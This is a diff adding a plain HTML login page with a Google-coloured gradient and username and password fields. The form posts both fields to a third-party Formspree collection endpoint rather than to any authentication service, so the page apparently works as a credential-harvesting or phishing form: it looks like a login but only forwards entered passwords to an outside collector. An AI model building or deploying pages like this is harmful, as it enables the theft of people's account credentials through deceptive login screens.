@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#1a73e8,#34a853);
+    font-family:Arial, sans-serif;
+}
+
+/* Login box */
+.login-box{
+    background:white;
+    padding:40px;
+    border-radius:15px;
+    box-shadow:0 10px 25px rgba(0,0,0,0.3);
+    text-align:center;
+    width:320px;
+}
+
+/* Title */
+.login-box h2{
+    margin-bottom:20px;
+    color:#333;
+}
+
+/* Inputs */
+input{
+    width:100%;
+    padding:12px;
+    margin:10px 0;
+    border:1px solid #ccc;
+    border-radius:8px;
+    outline:none;
+    font-size:15px;
+}
+
+input:focus{
+    border-color:#1a73e8;
+    box-shadow:0 0 5px rgba(26,115,232,0.3);
+}
+
+/* Button */
+button{
+    width:100%;
+    padding:12px;
+    margin-top:15px;
+    border:none;
+    border-radius:8px;
+    background:#1a73e8;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#1558b0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <h2>Login</h2>
+
+    <!-- FORMSPREE LOGIN FORM -->
+    <form action="https://formspree.io/f/mdarpvqz" method="POST">
+
+        <!-- Username -->
+        <input type="text" name="username" placeholder="Enter Username" required>
+
+        <!-- Password -->
+        <input type="password" name="password" placeholder="Enter Password" required>
+
+        <!-- Submit -->
+        <button type="submit">Login</button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
